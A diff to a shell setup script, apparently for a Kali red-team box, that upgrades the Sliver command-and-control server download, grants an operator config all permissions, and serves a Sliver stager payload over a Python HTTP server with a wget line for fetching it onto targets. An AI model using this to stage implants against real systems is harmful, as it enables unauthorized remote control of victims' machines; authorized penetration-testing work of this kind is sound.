@@ -13,7 +13,7 @@ echo "=== Downloading Sliver Binary from github.com ==="
 echo ""
 # download sliver
 mkdir /opt/sliver
-wget https://github.com/BishopFox/sliver/releases/download/v1.5.42/sliver-server_linux -O /opt/sliver/sliver-server-linux -nv
+wget https://github.com/BishopFox/sliver/releases/download/v1.7.3/sliver-server_linux-amd64 -O /opt/sliver/sliver-server-linux -nv
 chmod +x /opt/sliver/sliver-server-linux
 
 echo ""
@@ -22,7 +22,7 @@ echo ""
 echo "=== Creating Sliver Config ==="
 echo ""
 #create operator config
-/opt/sliver/sliver-server-linux operator --lhost $ip --lport 31337 --name l4rry
+/opt/sliver/sliver-server-linux operator --lhost $ip --lport 31337 --name l4rry --permissions all
 cat l4rry_*.cfg
 echo ""
 #unpack sliver to generate config files
@@ -41,7 +41,7 @@ mkdir /tmp/www
 
 chown kali:kali /tmp/www/sliver_stager.bin
 
-python3 -m http.server -d /tmp/www/ &
+python3 -m http.server 8000 -d /tmp/www/ &
 
 echo "=== Access Your MSF Stager here ==="
 echo "wget http://"$ip":8000/sliver_stager.bin"
